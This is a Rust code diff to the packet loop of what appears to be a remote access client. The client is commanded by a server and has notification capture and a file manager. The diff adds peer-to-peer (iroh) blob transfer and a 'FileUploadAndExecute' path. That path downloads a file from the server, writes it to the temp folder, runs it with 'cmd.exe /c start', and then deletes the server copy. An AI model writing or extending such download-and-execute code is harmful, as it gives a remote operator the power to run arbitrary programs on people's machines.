@@ -55,7 +55,13 @@ pub async fn reading_loop(
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
             Ok(Some(ClientboundPacket::InitClient)) => {
-                let client_info = client_info(config.group.clone()).await;
+                let mut client_info = client_info(config.group.clone()).await;
+                // Since iroh_info is local to main, we need a way to pass it here.
+                // Or we can fetch it from our new iroh module.
+                if let Some(node) = crate::features::iroh::get_iroh_node().await {
+                    let node = node.lock().await;
+                    client_info.iroh = Some(node.info.clone());
+                }
                 
                 match send_packet(ServerboundPacket::ClientInfo(client_info.clone())).await {
                     Ok(_) => println!("Sent client info to server"),
@@ -261,6 +267,58 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StopNotificationCapture)) => {
                 stop_notification_capture();
+            }
+
+            Ok(Some(ClientboundPacket::SetIrohConfig(iroh_config))) => {
+                crate::features::iroh::set_iroh_config(iroh_config.server_node_id, iroh_config.derp_region).await;
+            }
+
+            Ok(Some(ClientboundPacket::IrohDownloadBlob(blob_info, target_folder_opt))) => {
+                let file_manager_path = file_manager.current_path.clone();
+                tokio::spawn(async move {
+                    if let Some(node_arc) = crate::features::iroh::get_iroh_node().await {
+                        let server_node_id = {
+                            let node = node_arc.lock().await;
+                            node.server_node_id.clone()
+                        };
+
+                        if let Some(server_id) = server_node_id {
+                            if let Ok(data) = crate::features::iroh::download_blob(server_id, blob_info.clone()).await {
+                                let hash_str = blob_info.hash.clone();
+                                match blob_info.context {
+                                    BlobContext::FileUpload => {
+                                        let base_path = if let Some(ref target_folder) = target_folder_opt {
+                                            std::path::PathBuf::from(target_folder)
+                                        } else {
+                                            file_manager_path
+                                        };
+                                        let path = base_path.join(&blob_info.name);
+                                        if std::fs::write(path, data).is_ok() {
+                                            tokio::spawn(async move {
+                                                crate::features::iroh::delete_blob(hash_str).await;
+                                            });
+                                        }
+                                    }
+                                    BlobContext::FileUploadAndExecute => {
+                                        let temp_dir = std::env::temp_dir();
+                                        let file_path = temp_dir.join(&blob_info.name);
+                                        if std::fs::write(&file_path, data).is_ok() {
+                                            let path_str = file_path.to_string_lossy().to_string();
+                                            let _ = std::process::Command::new("cmd.exe")
+                                                .args(["/c", "start", "", &path_str])
+                                                .spawn();
+                                            tokio::spawn(async move {
+                                                crate::features::iroh::delete_blob(hash_str).await;
+                                            });
+                                        }
+                                    }
+                                    _ => {}
+                                }
+
+                            }
+                        }
+                    }
+                });
             }
 
             Ok(Some(p)) => {
